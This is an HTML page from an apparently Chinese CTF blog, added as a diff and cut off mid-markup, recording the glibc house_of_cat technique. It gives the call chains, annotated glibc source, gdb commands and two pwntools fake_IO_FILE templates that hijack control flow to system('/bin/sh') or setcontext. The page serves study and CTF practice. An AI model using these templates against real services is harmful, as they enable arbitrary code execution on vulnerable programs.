@@ -1,0 +1,807 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/txbynq.jpg">
+  <link rel="icon" href="/img/txbynq.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="OSLike">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2.34取消掉的hook 先端出完整调用链 12exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode__malloc_assert-&gt; __fxprintf-&gt;__vfxprintf-&gt;locked">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IO_FILE链house_of_cat链记录">
+<meta property="og:url" content="http://example.com/2025/06/27/IO-FILE%E9%93%BEhouse-of-cat%E9%93%BE%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="OSLike&#39;s Blog">
+<meta property="og:description" content="2.34取消掉的hook 先端出完整调用链 12exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode__malloc_assert-&gt; __fxprintf-&gt;__vfxprintf-&gt;locked">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ts1.cn.mm.bing.net/th/id/R-C.6f24c717cbea681c7ff9a3775200fc3a?rik=Z5k42qGtBb5Ydw&riu=http%3a%2f%2farsenetang.github.io%2fimages%2flogo.jpg&ehk=oYmEy9T4nBZNWyNJ9qICb9a2tqRmr57tD0%2bdsw6dWFo%3d&risl=&pid=ImgRaw&r=0">
+<meta property="article:published_time" content="2025-06-27T12:45:48.000Z">
+<meta property="article:modified_time" content="2025-06-27T15:31:40.543Z">
+<meta property="article:author" content="OSLike">
+<meta property="article:tag" content="knowledge">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ts1.cn.mm.bing.net/th/id/R-C.6f24c717cbea681c7ff9a3775200fc3a?rik=Z5k42qGtBb5Ydw&riu=http%3a%2f%2farsenetang.github.io%2fimages%2flogo.jpg&ehk=oYmEy9T4nBZNWyNJ9qICb9a2tqRmr57tD0%2bdsw6dWFo%3d&risl=&pid=ImgRaw&r=0">
+  
+  
+  
+  <title>IO_FILE链house_of_cat链记录 - OSLike&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"rTccdNadc9XbepHsHq0yeMEk-gzGzoHsz","app_key":"XSYHRE8TrMTHTcH1w137uSk9","server_url":"https://rtccdnad.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>OSLike</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://wllm1013.github.io/img/08067.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="IO_FILE链house_of_cat链记录"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        OSLike
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-27 20:45" pubdate>
+          2025年6月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          47 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">IO_FILE链house_of_cat链记录</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2025年6月27日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>2.34取消掉的hook</p>
+<p>先端出完整调用链</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">exit</span>-&gt;</span>__<span class="hljs-function"><span class="hljs-title">run_exit_handlers</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">cleanup</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">flush_all_lockp</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">wfile_seekoff</span>-&gt;</span>_IO_switch_to_wget_mode<br>__<span class="hljs-function"><span class="hljs-title">malloc_assert</span>-&gt;</span> __<span class="hljs-function"><span class="hljs-title">fxprintf</span>-&gt;</span>__<span class="hljs-function"><span class="hljs-title">vfxprintf</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">locked_vfxprintf</span>-&gt;</span>__<span class="hljs-function"><span class="hljs-title">vfprintf_internal</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">wfile_seekoff</span>-&gt;</span>_IO_switch_to_wget_mode<br></code></pre></td></tr></table></figure>
+
+<p>两个题目的<code>fake_IO_FILE</code>，当模板用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO_FILE =  <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> <span class="hljs-comment"># rdi</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># fp-&gt;_wide_data-&gt;(_IO_write_ptr) &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># rcx!=0</span><br>fake_IO_FILE += p64(base+<span class="hljs-number">0x21b6a0</span>+<span class="hljs-number">0x60</span>) <span class="hljs-comment"># rdx</span><br>fake_IO_FILE += p64(base+libc.sym.system) <span class="hljs-comment"># end call</span><br>fake_IO_FILE =  fake_IO_FILE.ljust(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _chain</span><br>fake_IO_FILE =  fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(base+<span class="hljs-number">0x21c100</span>) <span class="hljs-comment"># _lock writeable</span><br>fake_IO_FILE =  fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(base+<span class="hljs-number">0x21b6a0</span>+<span class="hljs-number">0x30</span>) <span class="hljs-comment"># _wide_data</span><br>fake_IO_FILE =  fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># _mode</span><br>fake_IO_FILE =  fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(base+libc.sym._IO_wfile_jumps+<span class="hljs-number">0x30</span>) <span class="hljs-comment"># _wide_data</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span><br>fake_IO_FILE += p64(base+<span class="hljs-number">0x21b6a0</span>+<span class="hljs-number">0x40</span>) <span class="hljs-comment">#_wide_data-&gt;_wide_vtable，_wide_data+0x10</span><br><br>fake_io_addr=heapbase+<span class="hljs-number">0xb00</span> 	<span class="hljs-comment"># 伪造的fake_IO结构体的chunk_pre_size的位置</span><br>next_chain = <span class="hljs-number">0</span><br>fake_IO_FILE=p64(rdi)         <span class="hljs-comment">#_flags=rdi，如果填入/bin/sh，那么rdi存的就是/bin/sh</span><br>fake_IO_FILE+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span><br>fake_IO_FILE +=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># rcx!=0(FSOP)</span><br>fake_IO_FILE +=p64(fake_io_addr+<span class="hljs-number">0xb0</span>)<span class="hljs-comment">#_IO_backup_base 此处对应rax1+0x20，是执行函数时的rdx</span><br>fake_IO_FILE +=p64(call_addr)<span class="hljs-comment">#_IO_save_end=call addr(call setcontext/system)</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heapbase+<span class="hljs-number">0x1000</span>)  <span class="hljs-comment"># _lock here need a writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE +=p64(fake_io_addr+<span class="hljs-number">0x30</span>) <span class="hljs-comment">#_wide_data,rax1_addr</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) <span class="hljs-comment">#mode=1</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># vtable=IO_wfile_jumps+0x10  FSOP改为IO_wfiel_jumps+0x30</span><br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span><br>fake_IO_FILE += p64(fake_io_addr+<span class="hljs-number">0x40</span>)  <span class="hljs-comment"># rax2_addr</span><br></code></pre></td></tr></table></figure>
+
+<p>函数大全</p>
+<p>本文提到的fp均为例如stderr+0一般开头偏移为0的完整的fake_IO_FILE，若只能控制不完整的fake_IO_FILE，需要自行调整对应偏移和结构体内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_flush_all_lockp(<span class="hljs-type">int</span> do_lock)<br>&#123;<br>    <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>    FILE *fp;<br><br>    <span class="hljs-comment">// 遍历 _IO_list_all</span><br>    <span class="hljs-keyword">for</span> (fp = (FILE *)_IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)<br>    &#123;<br>        <span class="hljs-comment">// 条件判断</span><br>        <span class="hljs-comment">// 两组条件，满足其一，就会执行_IO_OVERFLOW</span><br>        <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) || <br>            (_IO_vtable_offset(fp) == <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>            ) &amp;&amp; _IO_OVERFLOW(fp, EOF) == EOF)<br>            result = EOF;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们会选择fp-&gt;_mode&gt;0以去绕过_IO_wfile_seekoff中的一个if，_IO_vtable_offset(fp)&#x3D;&#x3D;0就是fp-&gt;_vtable_offset&#x3D;&#x3D;0，调试主要用这些</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">p *stderr<br>p (struct _IO_FILE_plus)*stderr<br>p *stderr-&gt;_wide_data<br></code></pre></td></tr></table></figure>
+
+<p>前面通过了然后进_IO_OVERFLOW(fp, EOF)中，_IO_OVERFLOW(fp, EOF)相当于(_IO_FILE_plus)fp-&gt;vtable-&gt;__overflow，就是我们为(struct _IO_FILE_plus)fp-&gt;vtable处我们覆盖的值，(_IO_wfile_jumps+0x30+0x18)(FSOP)&#x2F;(_IO_wfile_jumps+0x10+0x38)(__malloc_assert)&#x3D;_IO_wfile_seekoff，前一个加的就是我们在vtable数据段处为_IO_wfile_jumps加的值，后面加的就是看汇编到达对应函数call时候加的值，从而导致一定会跳转到_IO_wfile_seekoff这条链</p>
+<p>_IO_wfile_seekoff这里主要是控制fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base，这样就只能过到_IO_switch_to_wget_mode的_IO_WOVERFLOW，FSOP中相当于fp的_IO_backup_base &gt; _IO_save_base，__malloc_assert中相当于fp的_IO_write_end &gt; _IO_write_ptr</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">off64_t</span><br>_IO_wfile_seekoff(FILE *fp, <span class="hljs-type">off64_t</span> offset, <span class="hljs-type">int</span> dir, <span class="hljs-type">int</span> mode)<br>&#123;<br>    <span class="hljs-keyword">if</span> (mode == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> do_ftell_wide(fp);<br><br>    <span class="hljs-type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) || _IO_in_put_mode(fp)); <span class="hljs-comment">// true</span><br>    <span class="hljs-comment">// #define _IO_in_put_mode(_fp) ((_fp)-&gt;_flags &amp; 0x800)</span><br><br>    <span class="hljs-keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode(fp))<br>        <span class="hljs-keyword">return</span> WEOF;<br></code></pre></td></tr></table></figure>
+
+<p>最后需要进入_IO_WOVERFLOW(fp, WEOF)，_IO_WOVERFLOW(fp, WEOF)相当于fp-&gt;_wide_data-&gt;_wide_vtable-&gt;__overflow，于是可以控制原fp的_IO_save_end到我们需要call跳转的函数，例如说system、setcontext+61。rdi、rdx、rcx可控，rsi始终为0xffffffff，rcx需要小于rdx，若只执行一个函数则相当于fp的_flags、_IO_backup_base、_IO_save_base需要被控制，且_IO_save_base需要小于_IO_backup_base。执行的函数若是system，则直接使fp-&gt;_flags赋值为字符串”&#x2F;bin&#x2F;sh\x00”即可；若是setcontenxt+61，则fp-&gt;_IO_backup_base是需要控制的值，如果为&amp;fake_IO_FILE+0xb0，则fake_IO_FILE后方直接跟rdi、rsi、rbp、rbx、rdx、?、rcx、ropchain、ret，但因为ropchain是直接可以被ret到的，所以setcontext部分可以直接填0然后在ropchain处控制寄存器的值完成获得flag，不过若ropchain长度有限刚好差几个寄存器的长度，那么可以试试setcontext。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_switch_to_wget_mode(FILE *fp)<br>&#123;<br>    <span class="hljs-keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">wint_t</span>)_IO_WOVERFLOW(fp, WEOF) == WEOF)<br>            <span class="hljs-keyword">return</span> EOF;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_WOVERFLOW(FP,CH) WJUMP1(__overflow, FP, CH)</span><br>((*(__typeof__(((<span class="hljs-keyword">struct</span> _IO_FILE)&#123;&#125;)._wide_data) *)(((<span class="hljs-type">char</span> *)((fp))) + ((<span class="hljs-type">size_t</span>)&amp;(((<span class="hljs-keyword">struct</span> _IO_FILE*)<span class="hljs-number">0</span>)-&gt;_wide_data))))-&gt;_wide_vtable-&gt;__overflow)(fp, (<span class="hljs-number">0xffffffff</span>u))<br>fp-&gt;_wide_data-&gt;_wide_vtable-&gt;__overflow<br></code></pre></td></tr></table></figure>
+
+<p>一些标准的结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">type = <span class="hljs-keyword">struct</span> _IO_FILE &#123;<br>    <span class="hljs-type">int</span> _flags;<br>    <span class="hljs-type">char</span> *_IO_read_ptr;<br>    <span class="hljs-type">char</span> *_IO_read_end;<br>    <span class="hljs-type">char</span> *_IO_read_base;<br>    <span class="hljs-type">char</span> *_IO_write_base;<br>    <span class="hljs-type">char</span> *_IO_write_ptr;<br>    <span class="hljs-type">char</span> *_IO_write_end;<br>    <span class="hljs-type">char</span> *_IO_buf_base;<br>    <span class="hljs-type">char</span> *_IO_buf_end;<br>    <span class="hljs-type">char</span> *_IO_save_base;<br>    <span class="hljs-type">char</span> *_IO_backup_base;<br>    <span class="hljs-type">char</span> *_IO_save_end;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br>    <span class="hljs-type">int</span> _fileno;<br>    <span class="hljs-type">int</span> _flags2;<br>    <span class="hljs-type">__off_t</span> _old_offset;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>    <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>    <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br>    _IO_lock_t *_lock;<br>    <span class="hljs-type">__off64_t</span> _offset;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>    <span class="hljs-type">void</span> *_freeres_buf;<br>    <span class="hljs-type">size_t</span> __pad5;<br>    <span class="hljs-type">int</span> _mode;<br>    <span class="hljs-type">char</span> _unused2[<span class="hljs-number">20</span>];<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">    +0<span class="hljs-title">x0000</span> <span class="hljs-title">file</span>                 :</span> FILE<br>    +<span class="hljs-number">0x00d8</span> vtable               : <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *</span><br><span class="hljs-class"><span class="hljs-title">pwndbg</span>&gt;</span> dt <span class="hljs-string">&quot;struct _IO_wide_data&quot;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span></span><br><span class="hljs-class">    +0<span class="hljs-title">x0000</span> _<span class="hljs-title">IO_read_ptr</span>         :</span> <span class="hljs-type">wchar_t</span> *<br>    +<span class="hljs-number">0x0008</span> _IO_read_end         : <span class="hljs-type">wchar_t</span> *<br>    +<span class="hljs-number">0x0010</span> _IO_read_base        : <span class="hljs-type">wchar_t</span> *<br>    +<span class="hljs-number">0x0018</span> _IO_write_base       : <span class="hljs-type">wchar_t</span> *<br>    +<span class="hljs-number">0x0020</span> _IO_write_ptr        : <span class="hljs-type">wchar_t</span> *<br>    +<span class="hljs-number">0x0028</span> _IO_write_end        : <span class="hljs-type">wchar_t</span> *<br>    +<span class="hljs-number">0x0030</span> _IO_buf_base         : <span class="hljs-type">wchar_t</span> *<br>    +<span class="hljs-number">0x0038</span> _IO_buf_end          : <span class="hljs-type">wchar_t</span> *<br>    +<span class="hljs-number">0x0040</span> _IO_save_base        : <span class="hljs-type">wchar_t</span> *<br>    +<span class="hljs-number">0x0048</span> _IO_backup_base      : <span class="hljs-type">wchar_t</span> *<br>    +<span class="hljs-number">0x0050</span> _IO_save_end         : <span class="hljs-type">wchar_t</span> *<br>    +<span class="hljs-number">0x0058</span> _IO_state            : <span class="hljs-type">__mbstate_t</span><br>    +<span class="hljs-number">0x0060</span> _IO_last_state       : <span class="hljs-type">__mbstate_t</span><br>    +<span class="hljs-number">0x0068</span> _codecvt             : <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span></span><br><span class="hljs-class">    +0<span class="hljs-title">x00d8</span> _<span class="hljs-title">shortbuf</span>            :</span> <span class="hljs-type">wchar_t</span> [<span 